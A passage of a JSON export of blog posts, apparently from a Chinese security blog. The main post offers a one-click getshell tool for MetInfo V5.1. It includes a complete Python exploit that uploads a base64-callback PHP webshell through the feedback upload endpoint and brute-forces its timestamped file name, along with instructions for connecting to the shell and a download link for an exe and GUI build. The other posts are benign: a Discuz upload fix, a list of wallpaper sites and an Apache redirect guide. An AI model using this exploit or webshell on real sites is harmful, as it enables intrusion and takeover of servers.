src=\"data:image/gif;base64,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\" data-src=\"http://7xusrl.com1.z0.glb.clouddn.com/%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E5%B7%A5%E5%85%B7.png\" alt=\"Akkuman\" /\u003e\u003c/p\u003e\n","title":"编码转换工具"},{"content":"\n\n\n----------\n# 漏洞解析：\n----------\n**config/config.inc.php**\n```php\n$langoks = $db-\u003eget_one(\"SELECT * FROM $met_lang WHERE lang='$lang'\");\n\nif(!$langoks)die('No data in the database,please reinstall.');\n\nif(!$langoks[useok]\u0026\u0026!$metinfoadminok)okinfo('../404.html');\n\nif(count($met_langok)==1)$lang=$met_index_type;\n\n$query = \"SELECT * FROM $met_config WHERE lang='$lang' or lang='metinfo'\";//看这里\n\n$result = $db-\u003equery($query);\n\nwhile($list_config= $db-\u003efetch_array($result)){\n\n\tif($metinfoadminok)$list_config['value']=str_replace('\"', '\u0026#34;', str_replace(\"'\", '\u0026#39;',$list_config['value']));\n\n\t$settings_arr[]=$list_config;\n\n\tif($list_config['columnid']){\n\n\t\t$settings[$list_config['name'].'_'.$list_config['columnid']]=$list_config['value'];\n\n\t}else{\n\n\t\t$settings[$list_config['name']]=$list_config['value'];\n\n\t}\n\n}\n\n@extract($settings);\n```\n----------\n\n访问\n\nhttp:///localhost/metinfo5.1/index.php?lang=metinfo\n\n`SELECT * FROM met_config WHERE lang='metinfo' or lang='metinfo'`\n\n----------\n## 文件命名方式：\n----------\n**/feedback/uploadfile_save.php**\n```php\nsrand((double)microtime() * 1000000);\n\n$rnd = rand(100, 999);\n\n$name = date('U') + $rnd;\n\n$name = $name.\".\".$ext;\n\n```\n**文件保存在/upload/file/目录**\n\n命名方式就是时间戳去掉后三位，紧接着一个三位数的随机数\n\n可爆破：\n\n如\n\nhttp://127.0.0.1/upload/file/1465394396.php\n\n----------\n\n# 一键化利用工具：\n\n----------\n\n**本程序基于python编写**\n\n```python\n#!/usr/bin/env python\n#-*- coding: utf-8 -*-\n\nimport requests\nimport Queue\nimport threading\nimport time\nimport sys\n\n\nheaders = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.10 Safari/537.36'}\n\nurls = Queue.Queue()\n#http://hb.jhxjd.com/upload/file/1441445378.php\n\ndef bp(urls,time_out):\n    while not urls.empty():\n        base_url = urls.get()\n        response = None\n\n        try:\n            time.sleep(int(time_out))#延时设置\n            response = requests.get(base_url,headers=headers)\n            if response.status_code == 404:\n                print 'Not Fount----%s\\n' % base_url\n        except:\n            continue\n        finally:\n            if response:\n                with open('url.txt','a+') as f:\n                    f.write('%s?e=YXNzZXJ0\\n'%base_url)\n\ndef main(target_url,thread_num,time_out):\n\n    #取出当前时间戳并删除后四位\n    now = str(int(time.time()))[:-4]\n\n    #将所有的待爆破地址遍历并加入队列\n    for i in range(0,10):\n        for j in range(100,1000):\n            num_str = ''.join((str(i),str(j)))\n            url = ''.join(('%s/upload/file/%s' % (target_url,now),num_str,'.php'))\n            urls.put(url)\n\n    #上传文件\n    with open('xiaoma.php','w+') as fi:\n        fi.write(\"\u003c?php $e = $_REQUEST['e'];register_shutdown_function(base64_decode($e), $_REQUEST['Akkuman']);?\u003e\")\n    data = {\n            'fd_para[1][para]':'filea',\n            'fd_para[1][type]':'5'\n            }\n    files = {'filea': open(\"xiaoma.php\", 'rb')}\n    upload_url = '%s/feedback/uploadfile_save.php?met_file_format=pphphp\u0026met_file_maxsize=9999\u0026lang=metinfo' % target_url\n    res = requests.post(upload_url,data = data,files=files)\n    #等待两秒  文件上传\n    time.sleep(2)\n\n\n\n\n    #启动多线程\n    for i in range(int(thread_num)):\n        t = threading.Thread(target = bp,args=(urls,time_out,))\n        t.start()\n\n\nif __name__ == '__main__':\n    if len(sys.argv) != 4:\n        print 'Example : %s http://www.xxx.com 20 0' % sys.argv[0]\n    else:\n        main(sys.argv[1],sys.argv[2],sys.argv[3])\n\n```\n\n程序略显粗糙\n\n为了方便，我也把他打包成了**exe**\n\n然后闲着没事，想着简单地给他做了个**界面**,这样的\n![GUI](http://7xusrl.com1.z0.glb.clouddn.com/MetInfo5.1GetshellGui.png)\n\n----------\n# 文件说明\n----------\n\u003e MetInfo V5.1上传漏洞getshell利用工具\n\n\u003e \t作者 : Akkuman\n\n\u003e 漏洞原理详见http://www.wooyun.org/bugs/wooyun-2010-0139168\n\n\u003e 使用说明：\n\u003e 本目录有两个文件，一个py，一个exe\n\u003e 因为exe是py文件打包而成，故文件较大\n\u003e 64位系统测试使用通过\n\u003e \n\u003e 如果你安装了py2.x环境  py文件使用方法\n\u003e 打开cmd\n\u003e python baopo.py http://www.xxx.com 20 0\n\u003e 20是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定\n\u003e \n\u003e exe命令行文件使用方法\n\u003e 打开cmd\n\u003e baopo.exe http://www.xxx.com 20 0\n\u003e 20是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定\n\u003e \n\u003e GUI程序，应该不用说\n\u003e \n\u003e 关于getshell与结果\n\u003e 上传的是回调一句话木马\n\u003e ```php\n\u003e \u003c?php \u003e$e=$_REQUEST['e'];register_shutdown_function(base64_decode($e),$_\u003eREQUEST['Akkuman']);?\u003e\n\u003e ```\n\u003e 菜刀连接，密码是Akkuman\n\u003e \n\u003e 爆破结果会生成在**url.txt**\n\n----------\n# 下载地址：\n----------\n[(访问码:1475)](http://cloud.189.cn/t/v263QbMJVJ3u )\n\n*转载请注明出处*\n\n*作者博客 hacktech.cn | 53xiaoshuo.com*\n","cover":"","link":"2016/06/08/metinfo-v5-1-getshell一键化工具.html","preview":"\u003chr /\u003e\n\n\u003ch1\u003e漏洞解析：\u003c/h1\u003e\n\n\u003chr /\u003e\n\n\u003cp\u003e\u003cstrong\u003econfig/config.inc.php\u003c/strong\u003e\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-php\"\u003e$langoks = $db-\u0026gt;get_one(\u0026quot;SELECT * FROM $met_lang WHERE lang='$lang'\u0026quot;);\n\nif(!$langoks)die('No data in the database,please reinstall.');\n\nif(!$langoks[useok]\u0026amp;\u0026amp;!$metinfoadminok)okinfo('../404.html');\n\nif(count($met_langok)==1)$lang=$met_index_type;\n\n$query = \u0026quot;SELECT * FROM $met_config WHERE lang='$lang' or lang='metinfo'\u0026quot;;//看这里\n\n$result = $db-\u0026gt;query($query);\n\nwhile($list_config= $db-\u0026gt;fetch_array($result)){\n\n\tif($metinfoadminok)$list_config['value']=str_replace('\u0026quot;', '\u0026amp;#34;', str_replace(\u0026quot;'\u0026quot;, '\u0026amp;#39;',$list_config['value']));\n\n\t$settings_arr[]=$list_config;\n\n\tif($list_config['columnid']){\n\n\t\t$settings[$list_config['name'].'_'.$list_config['columnid']]=$list_config['value'];\n\n\t}else{\n\n\t\t$settings[$list_config['name']]=$list_config['value'];\n\n\t}\n\n}\n\n@extract($settings);\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003chr /\u003e\n","title":"MetInfo V5.1 GetShell一键化工具"},{"content":"\n\n\n----------\n# discuz 不能上传头像提示can not write to the data/tmp folder\n----------\n## 解释：\ndisucz头像上传不成功，提示data/tmp目录没有写入权限，这里的data/tmp是网站根目录uc_server/data/tmp这个目录，而不是根目录/data/tmp目录，其实/data下面本来没有tmp目录。\n\n\n\n## 解决办法：\n首先看看uc_server/data/tmp有无写入权限，如果有权限那么就按照如下解决方法，需要修改php.ini，找到open_basedir选项，行首加分号;注销即可。\n","cover":"","link":"2016/05/31/discuz 不能上传头像提示can not write to the datatmp folder.html","preview":"\u003chr /\u003e\n\n\u003ch1\u003ediscuz 不能上传头像提示can not write to the data/tmp folder\u003c/h1\u003e\n\n\u003chr /\u003e\n\n\u003ch2\u003e解释：\u003c/h2\u003e\n\n\u003cp\u003edisucz头像上传不成功，提示data/tmp目录没有写入权限，这里的data/tmp是网站根目录uc_server/data/tmp这个目录，而不是根目录/data/tmp目录，其实/data下面本来没有tmp目录。\u003c/p\u003e\n","title":"discuz 不能上传头像提示can not write to the data/tmp folder"},{"content":"\n\n\n我在这里给大家推荐几个不错的壁纸网站\n\n毕竟一张赏心悦目的壁纸能让你的工作效率提高不少\n\n**注意前方高能**\n\n**一大波网站即将来袭**\n\n\n# 一系列  如你所见\n- [alphacoders](http://wall.alphacoders.com/)\n- [wallpaperdj](http://wallpaperdj.com/)\n- [Wallhaven(*推荐*)](https://alpha.wallhaven.cc/)\n\n- [wallpaperswa](http://wallpaperswa.com/)\n- [eweb4](http://hdw.eweb4.com/)\n- [wallls](http://wallls.com/)\n- [topwallpapers](http://topwallpapers.pw/)\n- [wallpaperfo](http://www.wallpaperfo.com/)\n- [wallpapermay](http://www.wallpapermay.com/)\n- [picstopin](http://www.picstopin.com/)\n- [wallpaperup](http://www.wallpaperup.com/)\n- [wall321](http://www.wall321.com/)\n- [wallsave](http://www.wallsave.com/)\n- [wallpaperswide](http://wallpaperswide.com/)\n- [desktopnexus](https://www.desktopnexus.com/)\n- [goodfon](http://www.goodfon.su/)\n- [vladstudio(*推荐*)](http://www.vladstudio.com/zh/home/)\n- [simpledesktops(*极简*)](http://simpledesktops.com/)\n- [interfacelift](https://interfacelift.com/wallpaper/downloads/date/any/)\n- [kuvva](https://www.kuvva.com/)\n- [switch-box](http://switch-box.net/category/wallpaper)\n- [gde-fon](http://cn.gde-fon.com/)\n- [bingimages](http://www.istartedsomething.com/bingimages/)\n- [wallpaper4k(*推荐*)](http://www.wallpaper4k.com/)\n- [feelgrafix](http://feelgrafix.com/)\n- [facets(*元素块构图*)](http://www.facets.la/)\n- [justinmaller(*略抽象*)](http://justinmaller.com/)\n- [7-themes](http://7-themes.com/)\n- [superhd](http://superhd.site/)\n- [fondos7](http://www.fondos7.net/)\n- [forwallpaper(*推荐*)](http://cn.forwallpaper.com/)\n- [大B站的动漫壁纸，二次元可选](http://h.bilibili.com/wallpaper?action=list)\n\n就推荐到这里吧，基本上是搜刮别人的答案而来，自己都有看过\n","cover":"","link":"2016/05/31/many website of wallpaper.html","preview":"\u003cp\u003e我在这里给大家推荐几个不错的壁纸网站\u003c/p\u003e\n\n\u003cp\u003e毕竟一张赏心悦目的壁纸能让你的工作效率提高不少\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003e注意前方高能\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003e一大波网站即将来袭\u003c/strong\u003e\u003c/p\u003e\n\n\u003ch1\u003e一系列  如你所见\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"http://wall.alphacoders.com/\"\u003ealphacoders\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://wallpaperdj.com/\"\u003ewallpaperdj\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://alpha.wallhaven.cc/\"\u003eWallhaven(\u003cem\u003e推荐\u003c/em\u003e)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n","title":"Many Website Of WallPaper"},{"content":"\n\n\n# 还没开始就被别人绑定了域名\n\n## 事情的起因与发现\n刚买了个服务器搭建了一个dz，想着域名还没备案，就先搭建了起来，然后在做DDOS测试时偶然发现服务器被别人恶意把域名绑定了\n\n## 最初的解决方案\n没管。。。。。。\n后来发现有影响，朋友也一直给我说叫我整下\n\n## 利用重定向把恶意指向过来的域名指到别处\n要利用301重定向，首先我们要在Apache上配置一下，Apache默认是不开启.htaccess的\n\n\n\n\n\n----------\n\n\n### 0x01.编辑httpd.conf文件\n\n打开/etc/httpd/conf目录下的httpd.conf文件，找到这一行：\n```bash\nLoadModule rewrite_module modules/mod_rewrite.so\n```\n\u003e  当然，你得确定你的/etc/httpd/modules下有mod_rewrite.so这个文件\n\u003e ```bash\n\u003e ls /etc/httpd/modules | grep mod_rewrite\n\u003e ```\n如果你没有找到这一行，记得在httpd.conf文件里直接添加这一行\n\n\n----------\n\n\n### 0x02.设置AllowOverride\n\n同样的在httpd.conf文件中找到：\n```bash\n\u003cDirectory \"/var/www/html\"\u003e\n    #\n    # Possible values for the Options directive are \"None\", \"All\",\n    # or any combination of:\n    #   Indexes Includes FollowSymLinks SymLinksifOwnerMatch ExecCGI MultiViews\n    #\n    # Note that \"MultiViews\" must be named *explicitly* --- \"Options All\"\n    # doesn't give it to you.\n    #\n    # The Options directive is both complicated and important.  Please see\n    # http://httpd.apache.org/docs/2.4/mod/core.html#options\n    # for more information.\n    #\n    Options Indexes FollowSymLinks\n\n    #\n    # AllowOverride controls what directives may be placed in .htaccess files.\n    # It can be \"All\", \"None\", or any combination of the keywords:\n    #   Options FileInfo AuthConfig Limit\n    #\n    AllowOverride All\n\n    #\n    # Controls who can get stuff from this server.\n    #\n    Require all granted\n\u003c/Directory\u003e\n```\n或者它长这个样子：\n```bash\n\u003cDirectory /\u003e\nOptions FollowSymLinks\nAllowOverride None\n\u003c/Directory\u003e\n```\n什么，你告诉我还是找不到？？？\n那教你一个办法\n锁定关键词`FollowSymLinks`和`AllowOverride None`\n\n\u003e vi的向下查找命令是`:/你要查找的`\n\u003e vi的向上查找命令是`:?你要查找的`\n\u003e n是下一个\n\u003e N是上一个\n\n相信你已经找到了\n接下来把`None`改成`All`\n\n\n----------\n\n\n### 0x03.编写规则文件.htaccess\n跑去网站根目录下，比如我的是/var/www/html\n如果存在.htaccess，忽略下一步，直接打开编辑\n然后新建.htaccess文件`touch .htaccess`\n编辑.htaccess文件`vi .htaccess`\n添加如下规则\n```bash\nRewriteEngine on\nRewriteCond %{HTTP_HOST} ^别人的域名.com$ [OR]\nRewriteCond %{HTTP_HOST} ^www.别人的域名.com$\nRewriteRule ^(.*)$ http://www.自己的域名.com/$1 [R=301,L]\n```\n\n\n----------\n\n\n# 个人的修改\n我知道，你在网上所找到的方法都是上面那种代码，并且应该都没有提 教你怎么开启.htaccess\n![去他爹的](http://7xusrl.com1.z0.glb.clouddn.com/%E6%9A%B4%E6%BC%AB%E5%8E%BB%E4%BB%96%E7%88%B9%E7%9A%84%E9%80%BB%E8%BE%91.jpg)\n但是本人实验过，这配置进去还有问题，设置重启Apache后，访问网站提示500错误\n![500error](http://7xusrl.com1.z0.glb.clouddn.com/500error.png)\n机智的我总要查看日志啊\n```bash\ncat /var/log/messages | grep httpd\n```\n找到了错误\n![httpderror](http://7xusrl.com1.z0.glb.clouddn.com/QQ%E5%9B%BE%E7%89%8720160528214617.png)\n英语不太好，但是大致知道是服务器没有限定域名，需要修改ServerName,而ServerName字段值在httpd.conf中是被注释掉的\n我们在httpd.conf修改它\n```bash\n#ServerName: www.example.com:80\n```\n改为\n```bash\nServerName: 115.**.**.57:80\n```\n然后重启Apache，可以访问了\n\n\n----------\n\n\n# 后续\n好的故事都会有后续的\n\n以为这样就万事大吉了?\n\n但是我这个被坑得不轻\nadmin.xx.com都被他解析到我服务器上来了\n\n老衲怎么破\n![成龙挠头](http://7xusrl.com1.z0.glb.clouddn.com/%E6%9A%B4%E6%BC%AB%E6%88%90%E9%BE%99.jpg)\n.htaccess好像可以用正则表达式，一查，果然\n那就改一下.htaccess咯\n![shaxiao](http://7xusrl.com1.z0.glb.clouddn.com/%E6%9A%B4%E6%BC%AB%E5%82%BB%E7%AC%91.jpg)\n```bash\nRewriteEngine on\nRewriteCond %{HTTP_HOST} ^别人的域名.com$ [OR]\nRewriteCond %{HTTP_HOST} ^.*.别人的域名.com$\nRewriteRule ^(.*)$ http://www.自己的域名.com/$1 [R=301,L]\n```\n机智的你已经发现第三行中的www被我改成了.*，就是匹配0个或者多个字符，当然*你可以改成+\n\n然后重启Apache\n\n```bash\nsystemctl restart httpd\n```\n或者\n```bash\nservice httpd restart\n```\n\n现在我再访问。。。嘿嘿嘿，被我跳转到百度了\n![heihei](http://7xusrl.com1.z0.glb.clouddn.com/%E6%9A%B4%E6%BC%AB%E5%98%BF%E5%98%BF%E5%98%BF.jpeg)\n\n\n----------\n\n\n## 思考\n当然，还有其他的方法，自己也可以去网上找找\n对了，那个刚才在httpd.conf里换ip的地方也可换自己的域名，因为我的还在备案，就没改\n","cover":"","link":"2016/05/28/lamp服务器被人恶意绑定域名的解决办法.html","preview":"\u003ch1\u003e还没开始就被别人绑定了域名\u003c/h1\u003e\n\n\u003ch2\u003e事情的起因与发现\u003c/h2\u003e\n\n\u003cp\u003e刚买了个服务器搭建了一个dz，想着域名还没备案，就先搭建了起来，然后在做DDOS测试时偶然发现服务器被别人恶意把域名绑定了\u003c/p\u003e\n\n\u003ch2\u003e最初的解决方案\u003c/h2\u003e\n\n\u003cp\u003e没管。。。。。。\n后来发现有影响，朋友也一直给我说叫我整下\u003c/p\u003e\n\n\u003ch2\u003e利用重定向把恶意指向过来的域名指到别处\u003c/h2\u003e\n\n\u003cp\u003e要利用301重定向，首先我们要在Apache上配置一下，Apache默认是不开启.htaccess的\u003c/p\u003e\n","title":"lamp服务器被人恶意绑定域名的解决办法"}]